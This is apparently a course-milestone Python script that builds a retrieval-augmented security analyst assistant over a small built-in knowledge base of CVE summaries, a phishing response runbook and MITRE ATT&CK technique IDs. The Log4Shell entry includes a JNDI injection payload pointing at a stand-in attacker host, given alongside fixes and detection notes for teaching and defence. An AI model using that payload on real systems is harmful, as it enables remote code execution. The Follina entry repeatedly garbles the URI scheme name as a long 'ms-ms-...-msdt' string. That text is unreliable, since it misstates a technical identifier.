# Stage 4 Milestone — Security Analyst Assistant
#
# A fully interactive RAG-based assistant that:
#   - Loads security documents (CVEs, threat intel, runbooks)
#   - Answers questions grounded in those documents
#   - Maintains conversation history
#   - Classifies queries and routes them appropriately
#   - Works in interactive mode (type questions) or demo mode
#
# pip install anthropic sentence-transformers
# set ANTHROPIC_API_KEY=your-key-here

import os
import sys
import json
import numpy as np
from typing import List, Dict, Optional
from datetime import datetime

print("=" * 65)
print("  STAGE 4 MILESTONE: SECURITY ANALYST ASSISTANT")
print("=" * 65)

# ── Dependencies ───────────────────────────────────────────────────────────────
try:
    from sentence_transformers import SentenceTransformer
    HAVE_ST = True
except ImportError:
    from sklearn.feature_extraction.text import TfidfVectorizer
    HAVE_ST = False

try:
    import anthropic
    HAVE_ANTHROPIC = True
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        print("\nNote: ANTHROPIC_API_KEY not set. Running in retrieval-only demo mode.")
        HAVE_ANTHROPIC = False
    else:
        client = anthropic.Anthropic(api_key=api_key)
except ImportError:
    HAVE_ANTHROPIC = False
    print("anthropic package not installed. Running in retrieval-only mode.")

MODEL = "claude-sonnet-4-6"

# ── Knowledge Base ─────────────────────────────────────────────────────────────
# Extend this with your own internal documents, runbooks, CVEs, threat intel.
KNOWLEDGE_BASE = {
    "CVE-2021-44228 (Log4Shell)": """
Apache Log4j2 (CVE-2021-44228) — Critical CVSS 10.0
Vulnerability: JNDI injection via log message contents
Attack: ${jndi:ldap://attacker.com/x} in any logged field triggers remote class loading
Products: Any Java app using Log4j2 2.0-beta9 through 2.14.1
Fix: Upgrade to 2.17.1+. Mitigation: -Dlog4j2.formatMsgNoLookups=true
Detection: Outbound LDAP from app servers. ${jndi: patterns in HTTP logs.
""",
    "CVE-2022-30190 (Follina)": """
Microsoft MSDT (CVE-2022-30190) — Critical CVSS 7.8
Vulnerability: Remote code execution via ms-ms-ms-ms-ms-ms-ms-msdt URI scheme
Attack: Malicious Word documents reference ms-ms-ms-ms-ms-ms-ms-msdt:// URIs, executing PowerShell
No macros required. Executes when document is previewed in Explorer.
Products: Windows 10, 11, Server 2016/2019/2022 with Microsoft Office
Fix: KB5014697 patch. Disable ms-ms-ms-ms-ms-ms-ms-msdt:// URL protocol as workaround.
Detection: msdt.exe spawning as child of Office. Suspicious ms-ms-ms-ms-ms-ms-ms-msdt:// command lines.
""",
    "CVE-2023-44487 (HTTP/2 Rapid Reset)": """
HTTP/2 Rapid Reset DDoS (CVE-2023-44487) — High CVSS 7.5
Vulnerability: HTTP/2 stream cancellation causes server resource exhaustion
Attack: Attacker sends RST_STREAM immediately after each request header, maintaining
        many concurrent streams. Bypasses normal connection-based rate limits.
Products: Nginx, Apache httpd, .NET, Go HTTP/2 servers
Fix: Nginx 1.25.3+, patch vendor-specific. Rate limiting on stream resets.
Detection: High RESET_STREAM rates. CPU spike on web servers without traffic spike.
""",
    "Phishing Response Runbook": """
Phishing Incident Response
1. TRIAGE: User reports suspicious email → preserve original headers
2. ANALYSIS: Extract IOCs — sender domain, links, attachment hashes
3. CONTAINMENT: Block sender at email gateway, quarantine similar emails
4. SCOPE: Search mail logs for all recipients of same campaign
5. NOTIFICATION: Alert all recipients who may have clicked/opened
6. REMEDIATION: Reset credentials if attachment opened, scan endpoint
7. DOCUMENTATION: Log all IOCs in threat intel platform
Time targets: Triage <15min, Containment <1hr, Notification <4hr
""",
    "MITRE ATT&CK Quick Reference": """
Common MITRE ATT&CK Techniques:
T1190 - Exploit Public-Facing Application (web app exploits)
T1059.001 - PowerShell execution
T1003 - OS Credential Dumping (Mimikatz, etc.)
T1021.002 - Remote Services: SMB/Windows Admin Shares
T1078 - Valid Accounts (credential misuse)
T1486 - Data Encrypted for Impact (ransomware)
T1566 - Phishing
T1071 - Application Layer Protocol (C2 over HTTP/HTTPS/DNS)
T1027 - Obfuscated Files or Information (base64, packing)
T1055 - Process Injection
T1053 - Scheduled Task/Job (persistence)
T1110 - Brute Force
""",
}

# ── RAG Engine ────────────────────────────────────────────────────────────────
class RAGEngine:
    def __init__(self, documents: Dict[str, str]):
        self.docs = documents
        self.chunks = []
        self.sources = []
        self._build_index()

    def _chunk(self, text: str, size: int = 120, overlap: int = 15) -> List[str]:
        words = text.split()
        chunks = []
        for i in range(0, len(words), size - overlap):
            c = ' '.join(words[i:i + size])
            if len(c.split()) > 20:
                chunks.append(c)
        return chunks

    def _build_index(self):
        for name, text in self.docs.items():
            for chunk in self._chunk(text):
                self.chunks.append(chunk)
                self.sources.append(name)

        if HAVE_ST:
            print("Loading embedding model (all-MiniLM-L6-v2)...")
            self.embed_model = SentenceTransformer('all-MiniLM-L6-v2')
            self.embeddings = self.embed_model.encode(self.chunks)
            self._embed = lambda t: self.embed_model.encode([t])[0]
        else:
            self.tfidf = TfidfVectorizer(stop_words='english', ngram_range=(1, 2))
            self.embeddings = self.tfidf.fit_transform(self.chunks).toarray()
            self._embed = lambda t: self.tfidf.transform([t]).toarray()[0]

        print(f"Indexed {len(self.docs)} documents → {len(self.chunks)} chunks")

    def retrieve(self, query: str, k: int = 3) -> List[Dict]:
        q = self._embed(query)
        sims = []
        for i, emb in enumerate(self.embeddings):
            dot = np.dot(q, emb)
            norm = np.linalg.norm(q) * np.linalg.norm(emb) + 1e-8
            sims.append(dot / norm)
        top = sorted(enumerate(sims), key=lambda x: x[1], reverse=True)[:k]
        return [{'text': self.chunks[i], 'source': self.sources[i], 'score': s}
                for i, s in top if s > 0.05]


# ── Assistant ─────────────────────────────────────────────────────────────────
class SecurityAssistant:
    SYSTEM = """You are an expert cybersecurity analyst assistant with deep knowledge of:
- Vulnerability analysis and CVEs
- Incident response and forensics
- Threat intelligence and MITRE ATT&CK framework
- Malware analysis and detection
- Network security and log analysis

Answer questions ONLY based on the provided context documents.
If information is not in the context, say so clearly — do not hallucinate.
Format your answers clearly with bullet points where appropriate.
Always cite which document your answer comes from."""

    def __init__(self):
        self.rag = RAGEngine(KNOWLEDGE_BASE)
        self.history: List[Dict] = []
        self.query_count = 0

    def ask(self, question: str) -> str:
        self.query_count += 1
        retrieved = self.rag.retrieve(question, k=4)

        if not retrieved:
            return "I couldn't find relevant information in the knowledge base for that question."

        context = "\n\n".join([
            f"[{r['source']}]\n{r['text']}"
            for r in retrieved
        ])

        user_msg = f"Context:\n{context}\n\nQuestion: {question}"

        self.history.append({"role": "user", "content": user_msg})

        if not HAVE_ANTHROPIC:
            # Demo mode: show what would be retrieved
            response = f"[Demo mode — no API key]\nRetrieved from: {', '.join(set(r['source'] for r in retrieved))}\nTop chunk: {retrieved[0]['text'][:200]}..."
        else:
            resp = client.messages.create(
                model=MODEL,
                max_tokens=600,
                system=self.SYSTEM,
                messages=self.history[-6:],  # last 3 turns of context
            )
            response = resp.content[0].text

        self.history.append({"role": "assistant", "content": response})
        return response

    def show_sources(self, question: str):
        retrieved = self.rag.retrieve(question, k=3)
        print(f"\n  Retrieved chunks for: '{question[:50]}'")
        for r in retrieved:
            print(f"  [{r['score']:.3f}] [{r['source']}] {r['text'][:80]}...")


# ── Main ───────────────────────────────────────────────────────────────────────
def run_demo(assistant: SecurityAssistant):
    """Run a scripted demo of the assistant."""
    demo_questions = [
        "What is Log4Shell and how does it work?",
        "How do I detect if Log4Shell was exploited on my servers?",
        "What MITRE ATT&CK technique covers ransomware?",
        "Walk me through the first steps of responding to a phishing incident.",
        "What is CVE-2023-44487 and how do I detect it?",
    ]

    print("\n── Demo Mode (scripted questions) ──\n")
    for q in demo_questions:
        print(f"\n{'─'*60}")
        print(f"Q: {q}")
        answer = assistant.ask(q)
        print(f"\nA: {answer}")
        print()


def run_interactive(assistant: SecurityAssistant):
    """Interactive chat mode."""
    print("\n── Interactive Mode ──")
    print("Type your security question. Commands: /sources, /history, /quit\n")

    while True:
        try:
            question = input("You: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if not question:
            continue
        if question.lower() in ('/quit', 'exit', 'quit'):
            print("Goodbye.")
            break
        if question.lower() == '/history':
            print(f"\nConversation history: {len(assistant.history)} messages")
            continue
        if question.lower().startswith('/sources'):
            q = question[8:].strip() or "security vulnerability"
            assistant.show_sources(q)
            continue

        answer = assistant.ask(question)
        print(f"\nAssistant: {answer}\n")


# ── Entry point ────────────────────────────────────────────────────────────────
assistant = SecurityAssistant()

if len(sys.argv) > 1 and sys.argv[1] == '--interactive':
    run_interactive(assistant)
else:
    run_demo(assistant)
    print("\n" + "=" * 65)
    print("  MILESTONE COMPLETE")
    print("=" * 65)
    print("\nTo run in interactive mode:")
    print("  python milestone_security_assistant.py --interactive")
    print("\nTo add your own documents:")
    print("  Add entries to the KNOWLEDGE_BASE dict at the top of this file.")
